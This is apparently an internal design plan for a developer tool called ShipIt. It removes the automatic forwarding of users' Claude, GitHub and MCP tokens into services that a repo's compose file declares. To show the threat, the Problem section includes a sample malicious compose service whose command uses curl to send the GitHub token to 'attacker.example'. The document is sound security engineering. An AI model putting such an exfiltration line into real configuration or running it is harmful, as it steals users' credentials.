---
title: Remove platform credential forwarding to compose services
description: Stop auto-forwarding the user's Claude/GitHub/MCP platform identity into repo-declared compose services; the source:platform:* path is removed and replaced by explicit user-supplied secrets.
---

# 184 — Remove Platform Credential Forwarding to Compose Services

## Overview

A compose service can declare, in the repo's committed `docker-compose.yml`, that it
wants one of the user's **platform-managed credentials** forwarded into its environment:

```yaml
x-shipit-secrets:
  - { name: ANTHROPIC_API_KEY, source: platform:claude_oauth }
  - { name: GITHUB_TOKEN,      source: platform:github_token }
```

`platform-credentials.ts` resolves `source: platform:*` against the *outer user's* real
identity — their Claude OAuth access token, their GitHub PAT, and any connected MCP OAuth
token (`platform:linear_oauth`, `platform:notion_oauth`). This feature removes that path:
`source: platform:*` is no longer an honored source for compose `x-shipit-secrets`. Compose
services receive only secrets the user has **explicitly** placed in the secret store.

## Problem

The forwarding is triggered entirely by a string in a repo-controlled file, and the value
lands in **service process environment** — i.e. attacker-controlled code if the repo is
hostile. A malicious repo needs nothing more than a committed compose file:

```yaml
services:
  evil:
    x-shipit-preview: auto                    # auto-starts when the repo is opened
    x-shipit-secrets:
      - { name: X, source: platform:github_token }
    command: sh -c 'curl https://attacker.example -d "$X"'
```

Opening the repo → the preview service auto-starts → the user's real GitHub token is
exfiltrated. The user never typed a credential for this repo; ShipIt handed over their
global platform identity on the strength of attacker-controlled config.

This is qualitatively worse than the agent-readability leak addressed in
`docs/183-compose-secret-isolation/plan.md`:

- **183** stops the *agent* from reading a service's env file. It explicitly does **not**
  stop the *service itself* from exfiltrating a secret it legitimately received (see 183
  Non-Goals). For a **user-supplied** secret that residual risk is acceptable — the user
  deliberately gave that value to this repo's services.
- **`source: platform:*`** is not user-deliberate per repo. It is ShipIt auto-forwarding
  the user's *global* identity into repo-controlled code. No amount of file-isolation fixes
  that, because the service is the attacker. The only real fix is to not forward it.

### Precedent

This is not a new direction — `docs/131-dogfood-seed-sessions/plan.md` already removed
`source: platform:github_token` from the dogfood compose for exactly this reason ("stop
forwarding the outer user's GitHub token… let the developer supply a dedicated testing
token instead"), swapping the auto-forward for a user-supplied secret. This feature
generalizes that decision to **all** platform sources, for **all** repos.

> **Bug to fix in passing.** Despite docs/131 and CLAUDE.md both stating the GitHub-token
> forward is gone, the live `docker-compose.yml` still carries
> `source: platform:github_token`. That line currently re-opens the hole 131 closed and is
> removed here along with the rest.

## Goals

- Remove `source: platform:*` as an honored source for compose `x-shipit-secrets`
  (`platform:claude_oauth`, `platform:github_token`, and the MCP OAuth providers
  `platform:linear_oauth` / `platform:notion_oauth`).
- Make the removal **discoverable**: when a compose file still declares `source: platform:*`,
  warn rather than silently dropping the value, so the user knows to set a user secret.
- Keep the dogfood flow working via **user-supplied** secrets, not forwarding.
- Leave the agent-scoped MCP OAuth path untouched — see Non-Goals.

## Non-Goals

- **MCP OAuth tokens reaching the agent are unaffected.** The agent's MCP servers receive
  platform OAuth tokens through a separate mechanism (`mcpOAuth` → `MCP_PLATFORM_<ID>` env,
  consumed via the `$platform:<id>` placeholder in MCP server blobs), not through compose
  `x-shipit-secrets` resolution. That path is the user wiring an MCP server into their own
  agent and is out of scope here. This feature only removes the **compose-service**
  `source: platform:*` resolution.
- This does not change how **user-supplied** service secrets are delivered or isolated —
  that is 183's job, and it remains valuable for the secrets the user does provide.

## Design

### 1. Stop resolving `source: platform:*` for compose secrets

The platform-credential provider is wired into exactly one place: compose secret
resolution (`index.ts` builds it → `runner-registry-factory` → `service-manager-setup` →
`ServiceManager` → `ServiceSecretsResolver` → `secret-resolver.ts`). Nothing else consumes
it. Remove the provider from that chain so `resolveValue()` no longer consults a platform
source.

`secret-resolver.ts` already falls through to `userSecrets[req.name]` when no provider is
supplied (covered today by the "ignores source field when no platformCredentials provider
is supplied" test), so a compose entry that still carries `source: platform:*` resolves
from the user secret store under its declared `name` — or to nothing if the user hasn't set
one.

Retire `platform-credentials.ts` and its provider type along with the wiring (it has no
other consumer). The MCP OAuth registry (`mcp-oauth-providers.ts`) stays — it still serves
the agent MCP path.

### 2. Warn on a now-unhonored `source: platform:*`

Silent fall-through would confuse anyone with an existing compose file: the service simply
comes up missing a value. When secret resolution sees a `source: platform:*` field on a
compose entry, emit a one-line warning through the existing service-log broadcast:

```text
service "<svc>": secret "<NAME>" declares source: platform:* which is no longer
forwarded — set a "<NAME>" secret in Settings → Secrets if the service needs it.
```

This is a log-side notice, not a new UI surface.

### 3. Dogfood compose uses user-supplied secrets

`docker-compose.yml`'s `dev` service drops `source:` from all three entries:

```yaml
x-shipit-secrets:
  - { name: ANTHROPIC_API_KEY }
  - { name: ANTHROPIC_AUTH_TOKEN }
  - { name: GITHUB_TOKEN }            # already source-less per docs/131 intent
```

The developer sets these once in the outer ShipIt's Secrets panel. `GITHUB_TOKEN` already
follows this pattern (docs/131); `ANTHROPIC_API_KEY` joins it.

**Accepted tradeoff (the rotation caveat).** `platform:claude_oauth` re-read the Claude CLI
OAuth token on every sync, so a rotating token stayed fresh automatically. A pasted user
secret does not auto-rotate. The substitute is a long-lived `ANTHROPIC_API_KEY` (which
does not rotate), set as a user secret. We accept losing the zero-config, auto-refreshing
login for the single dogfooding developer in exchange for closing the exfiltration class
for every user who opens an untrusted repo.

## Key Files

- `src/server/orchestrator/platform-credentials.ts` — retire the module (provider +
  `PLATFORM_SOURCES`). No other consumer remains once the compose chain stops using it.
- `src/server/orchestrator/secret-resolver.ts` — drop the `platformCredentials` resolution
  branch; add the warn-on-`source:` notice for compose entries.
- `src/server/orchestrator/service-secrets-resolver.ts`,
  `service-manager.ts`, `service-manager-setup.ts`, `runner-registry-factory.ts`,
  `index.ts` — remove the `platformCredentials` parameter threading.
- `src/server/shipit-docs/secrets.md` — remove the `source: platform:*` table and the
  "Useful for ShipIt-in-ShipIt" note; document that compose services receive only
  user-supplied secrets.
- `docker-compose.yml` — drop `source:` from the dogfood `dev` entries (and remove the
  lingering `source: platform:github_token`).
- `docs/183-compose-secret-isolation/plan.md` — trimmed to user-supplied service secrets
  (cross-linked).

## Tests

- `secret-resolver.test.ts`: a compose entry with `source: platform:*` resolves from
  `userSecrets[name]` (or empty) and never from a platform provider; the warning fires
  once per such entry.
- Remove/retire `platform-credentials.test.ts` with the module.
- Regression: a compose stack declaring `source: platform:github_token` does **not** inject
  the user's real GitHub token; with a same-named user secret set, the service gets the
  user-supplied value instead.

## Rollout / back-compat

1. Ship the resolver change so `source: platform:*` no longer forwards.
2. Existing repos that relied on a platform source see the warning and set a user secret of
   the same `name`. This is the only behavioral break, and it is the intended one.
3. Update the dogfood compose and the seed/testing-secret docs so the inner ShipIt boots
   from user-supplied `ANTHROPIC_API_KEY` + `GITHUB_TOKEN`.
